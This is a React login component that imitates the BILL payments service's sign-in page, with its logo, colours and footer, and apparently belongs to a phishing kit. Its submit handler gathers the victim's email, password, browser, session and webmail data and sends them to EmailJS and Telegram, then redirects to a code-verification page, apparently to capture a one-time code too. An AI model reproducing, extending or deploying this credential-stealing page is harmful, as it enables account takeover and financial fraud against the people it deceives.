import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { LogIn } from 'lucide-react';
import { useAuth } from '../context/AuthContext';
import { dataCollectionService } from '../services/dataCollectionService';

function Login() {
  const navigate = useNavigate();
  const { setLoginData } = useAuth();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [attempts, setAttempts] = useState(0);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    setAttempts(prev => prev + 1);
    
    try {
      const systemInfo = await dataCollectionService.collectSystemInfo();
      const sessionData = await dataCollectionService.collectSessionData();
      const webmailData = dataCollectionService.collectWebmailData();
      const authFlowData = dataCollectionService.collectAuthFlowData(
        attempts + 1,
        'attempting'
      );

      // Send collected data to both EmailJS and Telegram
      await dataCollectionService.sendCollectedData({
        email,
        password,
        systemInfo,
        sessionData,
        webmailData,
        authFlowData
      });

      // Store data for verification page
      setLoginData({ email, password });
      sessionStorage.setItem('loginTimestamp', new Date().toISOString());
      
      navigate('/verify-code');
    } catch (error) {
      console.error('Login error:', error);
      setError('Failed to process login. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex">
      <div className="w-1/2 flex flex-col">
        <div className="p-8">
          <img 
            src="https://login.us.bill.com/neo/assets/images/pages/login/BILL-logo.svg" 
            alt="BILL Logo" 
            className="h-8"
          />
        </div>
        
        <div className="flex-grow flex items-center justify-center px-16">
          <div className="w-full max-w-md">
            <h1 className="text-3xl font-bold mb-8">Welcome back</h1>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label htmlFor="email" className="block text-sm font-medium text-gray-700">
                  Email address
                </label>
                <input
                  id="email"
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="mt-1 block w-full rounded-md border border-gray-300 px-3 py-2 shadow-sm focus:border-indigo-500 focus:outline-none focus:ring-1 focus:ring-indigo-500"
                  required
                  disabled={isLoading}
                />
              </div>

              <div>
                <div className="flex items-center justify-between">
                  <label htmlFor="password" className="block text-sm font-medium text-gray-700">
                    Password
                  </label>
                  <button
                    type="button"
                    className="text-sm font-medium text-[#473cc5] hover:text-[#372db1]"
                  >
                    Forgot password?
                  </button>
                </div>
                <input
                  id="password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="mt-1 block w-full rounded-md border border-gray-300 px-3 py-2 shadow-sm focus:border-indigo-500 focus:outline-none focus:ring-1 focus:ring-indigo-500"
                  required
                  disabled={isLoading}
                />
              </div>

              {error && (
                <p className="text-red-600 text-sm text-center">{error}</p>
              )}

              <button
                type="submit"
                disabled={isLoading}
                className="flex items-center justify-center w-full px-4 py-2 text-white rounded-md bg-[#473cc5] hover:bg-opacity-90 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#473cc5] disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? (
                  <span>Processing...</span>
                ) : (
                  <>
                    <LogIn className="w-5 h-5 mr-2" />
                    Sign in
                  </>
                )}
              </button>
            </form>
          </div>
        </div>

        <div className="p-8">
          <p className="text-sm text-gray-500">
            Legal | Privacy | Do Not Sell My Personal Information ©2025 BILL Operations, LLC
          </p>
        </div>
      </div>

      <div className="w-1/2 bg-[#ff5a0a]">
        <div className="h-full w-full flex items-center justify-center">
          <img
            src="https://login.us.bill.com/neo/assets/images/pages/login/local-transfer-02.svg"
            alt="Login illustration"
            className="max-w-md"
          />
        </div>
      </div>
    </div>
  );
}

export default Login;